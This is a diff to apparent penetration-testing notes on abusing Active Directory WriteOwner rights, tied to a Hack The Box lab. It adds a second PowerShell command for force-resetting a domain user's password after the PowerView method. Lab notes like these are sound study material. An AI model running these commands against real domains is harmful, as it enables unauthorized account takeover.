@@ -14,7 +14,7 @@ The **WriteOwner** permission allows users to change an object’s owner. Atta
 
 ## WriteOwner on a User Account
 
-The attacker has **WriteOwner permissions** on a target user account. See the [Hack The Box machine EscapeTwo](htb-escapetwo.md)
+The attacker has **WriteOwner permissions** on a target user account. See the "Hack The Box machine EscapeTwo".
 
 ![[write-owner.png]]
 
@@ -49,7 +49,13 @@ Using the **PowerView** module, an attacker can reset a domain user’s passwo
 
 ```
 $NewPassword = ConvertTo-SecureString 'Lala123' -AsPlainText -Force
-
 Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword
+```
 
+
+Another way, in case Set-DomainUserPassword does not do the trick:
+
+```
+$NewPassword = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force 
+Set-ADAccountPassword -Identity 'ca_svc'  -NewPassword $NewPassword -Reset
 ```
